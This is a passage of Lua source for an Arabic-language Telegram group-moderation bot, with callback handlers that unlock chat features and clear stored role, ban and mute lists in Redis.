if tonumber(IdUser) == tonumber(UserId) then

local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التكرار', data =UserId..'/'.. 'lock_flood'},{text = 'قفل التكرار بالكتم', data =UserId..'/'.. 'lock_floodktm'},
},
{
{text = 'قفل التكرار بالطرد', data =UserId..'/'.. 'lock_floodkick'},{text = 'قفل التكرار بالتقييد', data =UserId..'/'.. 'lock_floodkid'},
},
{
{text = 'فتح التكرار', data =UserId..'/'.. 'unlock_flood'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
edit(ChatId,Msg_id,"٠ عليك اختيار نوع القفل او الفتح على امر التكرار", 'md', true, false, reply_markup)
end

elseif Text and Text:match('(%d+)/unlock_link') then
local UserId = Text:match('(%d+)/unlock_link')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Link"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الروابط").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_spam') then
local UserId = Text:match('(%d+)/unlock_spam')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Spam"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الكلايش").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_keypord') then
local UserId = Text:match('(%d+)/unlock_keypord')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Keyboard"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الكيبورد").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_voice') then
local UserId = Text:match('(%d+)/unlock_voice')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:vico"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الاغاني").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_gif') then
local UserId = Text:match('(%d+)/unlock_gif')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Animation"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح المتحركات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_files') then
local UserId = Text:match('(%d+)/unlock_files')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Document"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الملفات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_text') then
local UserId = Text:match('(%d+)/unlock_text')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:text"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الدردشه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_video') then
local UserId = Text:match('(%d+)/unlock_video')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Video"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الفيديو").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_photo') then
local UserId = Text:match('(%d+)/unlock_photo')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Photo"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الصور").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_username') then
local UserId = Text:match('(%d+)/unlock_username')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:User:Name"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح المعرفات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_tags') then
local UserId = Text:match('(%d+)/unlock_tags')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:hashtak"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح التاك").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_bots') then
local UserId = Text:match('(%d+)/unlock_bots')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Bot:kick"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح البوتات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_fwd') then
local UserId = Text:match('(%d+)/unlock_fwd')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:forward"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح التوجيه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_audio') then
local UserId = Text:match('(%d+)/unlock_audio')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Audio"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الصوت").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_stikear') then
local UserId = Text:match('(%d+)/unlock_stikear')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Sticker"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الملصقات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_phone') then
local UserId = Text:match('(%d+)/unlock_phone')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Contact"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الجهات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_joine') then
local UserId = Text:match('(%d+)/unlock_joine')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Join"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الدخول").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_addmem') then
local UserId = Text:match('(%d+)/unlock_addmem')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:AddMempar"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الاضافه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_videonote') then
local UserId = Text:match('(%d+)/unlock_videonote')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Unsupported"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح بصمه الفيديو").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_pin') then
local UserId = Text:match('(%d+)/unlock_pin')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."lockpin"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح التثبيت").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_tgservir') then
local UserId = Text:match('(%d+)/unlock_tgservir')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:tagservr"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الاشعارات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_markdaun') then
local UserId = Text:match('(%d+)/unlock_markdaun')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:Markdaun"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الماركدون").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_edits') then
local UserId = Text:match('(%d+)/unlock_edits')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:edit"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح التعديل").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_games') then
local UserId = Text:match('(%d+)/unlock_games')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Lock:geam"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح الالعاب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_flood') then
local UserId = Text:match('(%d+)/unlock_flood')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hdel(darket.."Spam:Group:User"..ChatId ,"Spam:User")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم فتح التكرار").unLock, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/Dev') then
local UserId = Text:match('(%d+)/Dev')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Dev:Groups") 
edit(ChatId,Msg_id,"٠ تم مسح مطورين البوت", 'md', false)
end
elseif Text and Text:match('(%d+)/Devss') then
local UserId = Text:match('(%d+)/Devss')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Devss:Groups") 
edit(ChatId,Msg_id,"٠ تم مسح مطورين الثانوين من البوت", 'md', false)
end
elseif Text and Text:match('(%d+)/Supcreator') then
local UserId = Text:match('(%d+)/Supcreator')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Supcreator:Group"..ChatId) 
edit(ChatId,Msg_id,"٠ تم مسح المنشئين الاساسيين", 'md', false)
end
elseif Text and Text:match('(%d+)/Owners') then
local UserId = Text:match('(%d+)/Owners')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Owners:Group"..ChatId) 
edit(ChatId,Msg_id,"٠ تم مسح المالكين", 'md', false)
end
elseif Text and Text:match('(%d+)/Creator') then
local UserId = Text:match('(%d+)/Creator')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Creator:Group"..ChatId) 
edit(ChatId,Msg_id,"٠ تم مسح منشئين الكروب", 'md', false)
end
elseif Text and Text:match('(%d+)/Manger') then
local UserId = Text:match('(%d+)/Manger')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Manger:Group"..ChatId) 
edit(ChatId,Msg_id,"٠ تم مسح المدراء", 'md', false)
end
elseif Text and Text:match('(%d+)/Admin') then
local UserId = Text:match('(%d+)/Admin')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Admin:Group"..ChatId) 
edit(ChatId,Msg_id,"٠ تم مسح ادمنيه الكروب", 'md', false)
end
elseif Text and Text:match('(%d+)/DelSpecial') then
local UserId = Text:match('(%d+)/DelSpecial')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Special:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح المميزين", 'md', false)
end

elseif Text and Text:match('(%d+)/Delkholat') then
local UserId = Text:match('(%d+)/Delkholat')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."kholat:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح جميع خولات المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Delwtk') then
local UserId = Text:match('(%d+)/Delwtk')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."wtka:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح جميع وتكات المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Deltwhd') then
local UserId = Text:match('(%d+)/Deltwhd')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."twhd:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح جميع متوحدين المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Delklb') then
local UserId = Text:match('(%d+)/Delklb')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."klb:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح جميع الكلاب المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Delmar') then
local UserId = Text:match('(%d+)/Delmar')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."mar:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح جميع حمير المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Delsmb') then
local UserId = Text:match('(%d+)/Delsmb')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."smb:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح جميع السمب الي هنا ف المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Del2rd') then
local UserId = Text:match('(%d+)/Del2rd')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."2rd:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح جميع القرود", 'md', false)
end
elseif Text and Text:match('(%d+)/Del3ra') then
local UserId = Text:match('(%d+)/Del3ra')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."3ra:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح جميع العرر", 'md', false)
end
elseif Text and Text:match('(%d+)/Del8by') then
local UserId = Text:match('(%d+)/Del8by')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."8by:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,"٠ تم مسح جميع الأغبياء", 'md', false)
end
elseif Text and Text:match('(%d+)/BanAll') then
local UserId = Text:match('(%d+)/BanAll')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."BanAll:Groups") 
edit(ChatId,Msg_id,"٠ تم مسح المحظورين عام", 'md', false)
end
elseif Text and Text:match('(%d+)/ktmAll') then
local UserId = Text:match('(%d+)/ktmAll')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."ktmAll:Groups") 
edit(ChatId,Msg_id,"٠ تم مسح المكتومين عام", 'md', false)
end
elseif Text and Text:match('(%d+)/BanGroup') then
local UserId = Text:match('(%d+)/BanGroup')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."BanGroup:Group"..ChatId) 
edit(ChatId,Msg_id,"٠ تم مسح المحظورين", 'md', false)
end
elseif Text and Text:match('(%d+)/SilentGroupGroup') then
local UserId = Text:match('(%d+)/SilentGroupGroup')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."SilentGroup:Group"..ChatId) 
edit(ChatId,Msg_id,"٠ تم مسح المكتومين", 'md', false)
end
end
end
end

luatele.run(CallBackLua)
 
